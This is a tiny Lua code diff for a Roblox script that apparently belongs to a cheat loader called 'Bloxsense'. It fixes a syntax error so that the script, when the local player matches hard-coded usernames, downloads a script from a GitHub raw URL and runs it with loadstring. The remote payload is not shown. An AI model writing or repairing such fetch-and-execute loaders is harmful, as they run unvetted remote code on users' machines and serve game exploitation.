@@ -2,7 +2,7 @@ local firstUser = "RobloxRoblox46713"
 local secondus = "oneshotxgod"
 local player = game.Players.LocalPlayer
 
-if player.Name == firstUser
+if player.Name == firstUser then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ur-dude/zxcgg/main/Script", true))()
     print('Connected to Bloxsense.gay')
     print('Connected!')
